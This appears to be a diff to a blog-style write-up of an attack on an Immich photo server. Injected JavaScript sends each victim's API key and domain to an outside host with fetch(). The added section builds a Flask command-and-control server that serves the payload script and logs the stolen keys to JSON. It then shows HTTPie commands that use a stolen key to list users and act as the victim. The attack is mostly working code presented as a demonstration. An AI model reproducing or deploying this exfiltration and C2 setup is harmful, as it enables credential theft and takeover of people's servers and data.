@@ -73,3 +73,65 @@ fetch('https://u.photo-frame.com/log?key=' + data.secret + '&domain=' + document
 I added the `document.domain` parameter, because in a real world scenario the attacker doesn't know where his script hit, and having the target domain is essential to map the key to its respective host. Another addition is the `no-cors` mode, that allows to send the request without requiring a response, effectively preventing the browser from blocking the outbound traffic due to [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS) policies.
 You can find the final script in the repository. To further mitigate suspicion I renamed it after the photographer of the original image.
 Now we have in our hands powerful credentials, we just set the permissions to "all", so the attacker can bypass all standard authentication challenges and gain full data access or even administrative control based on the victim privileges.
+### Attacker's server
+The last thing to do was orchestrating the attack, using a Command and Control infrastructure with two main capabilities: 
+1) hosting the malicious script to be fetched by the exploit;
+2) exposing an endpoint to capture and store the exfiltrated API keys.
+
+> I'm not a Python experienced programmer, the following code was developed with the help of LLMs and carefully reading the documentation.
+
+In the initial testing phase, I used a minimalist approach, so the malicious script was hosted using Python via the following command (executed in its folder):
+```bash
+$ python3 -m http.server 8080
+```
+This was sufficient to host the file and view incoming HTTP requests directly in the terminal, but it lacked structural persistence. The exfiltrated keys only appeared in the raw query strings of the server logs, making them difficult to parse, organize, and store securely for long-term exploitation.
+
+To implement a better infrastructure I decided to use a custom Python program using the [Flask](https://flask.palletsprojects.com/en/stable/) framework, as it seemed the quickest and easier way to get up and running without getting crazy. It has a clear code structure, that remembers me the classical functions.
+You need to create a virtual environment to use it, but I will skip this steps as you can simply read the [installation guide](https://flask.palletsprojects.com/en/stable/installation/).
+The application I built is made up of two main components: one endpoint for serving the script, the other for managing exfiltration.
+The first routing endpoint handles the initial delivery phase, safely serving the payload from an isolated static directory. It is simple achieved with this three lines:
+```python
+@app.route("/tomas.js")
+def serve_script():
+    return send_from_directory(os.path.join(app.root_path, 'static'), 'tomas.js')
+```
+The second endpoint acts as a listener for the exfiltration phase, extracting the raw key and domain URL parameters sent by the victim's browser via the GET request:
+```python
+@app.route("/log")
+def apikey_exfiltration():
+    key = request.args.get('key', 'NO_KEY')
+    domain = request.args.get('domain', 'NO_DOMAIN')
+    [...]
+```
+Then, to store the keys, the program generates an unique timestamp for each incoming request and maps the data into a clean dictionary structure ready to export to a JSON file inside a dedicated logs directory:
+```python
+[...]
+    data = {
+        "timestamp": datetime.now().strftime('%Y%m%d_%H%M%S'),
+        "domain": domain,
+        "key": key
+    }
+
+    file_name = "log_" + time + ".json"
+    file_path = os.path.join('logs', file_name)
+
+    with open(file_path, 'w') as f:
+        json.dump(data, f, indent=4)
+
+    return "OK"
+```
+To start the server you just need to run the command `$ flask --app server run -p 8080` inside your virtual environment. As stated in the message shown in the shell, this is just a development server not meant for production, but for this demo is sufficient.
+![](attachments/Pasted%20image%2020260522133824.png)
+You can see the incoming requests logged on screen, for the script first and for the exfiltration then. The program correctly extracts and saves the keys in an output JSON file.
+![](attachments/Pasted%20image%2020260522134101.png)
+### Using the key
+With the keys stored in simple JSON files, the attacker could easily automate data exfiltration. I'm not a professional attacker, and my objective is already reached, so I will just show you some examples to show that the API key is working. To do so in a simple way I choose to move on from `curl` and use [HTTPie](https://httpie.io/), a program that simplifies APIs interaction meant for developers. 
+The usage is pretty simple, e.g. for a GET:
+```bash
+$ http GET https://immich.mnlpns.it/api/endpoint x-api-key:[API-KEY]
+```
+There are endpoints for almost everything you can do on the server as the user, as retrieving the list of assets, creating albums, sharing things, downloading the library and, if the account is also an admin you can edit configs, download or upload the database. You can have full access of the application! 
+In the following screenshots you can see how to get a list of users and their details, and then how to send a notification to one of them.
+![](attachments/Pasted%20image%2020260522144459.png)
+![](attachments/Pasted%20image%2020260522144601.png)
+![](attachments/Pasted%20image%2020260522144715.png)
